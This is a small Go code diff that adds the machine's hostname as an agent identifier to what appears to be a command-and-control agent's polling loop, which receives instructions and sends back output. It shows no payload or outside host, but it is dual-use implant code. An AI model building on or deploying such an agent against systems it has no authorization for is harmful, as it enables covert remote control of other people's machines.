@@ -3,6 +3,7 @@ package main
 import (
 	"common/profiles"
 	"fmt"
+	"os"
 	"time"
 )
 
@@ -20,8 +21,11 @@ func main() {
 	profile, err := profiles.Load(rawProfile)
 	handleErr(err)
 
+	agentId, err := os.Hostname()
+	handleErr(err)
+
 	for range time.Tick(profile.GetTickAmount()) {
-		instruction, err := receive(&profile)
+		instruction, err := receive(&agentId, &profile)
 		if err != nil {
 			fmt.Println("receive error:", err)
 			continue
@@ -41,7 +45,7 @@ func main() {
 			}
 		}
 
-		if err := send(&profile, &output); err != nil {
+		if err := send(&agentId, &profile, &output); err != nil {
 			fmt.Println("send error:", err)
 			continue
 		}
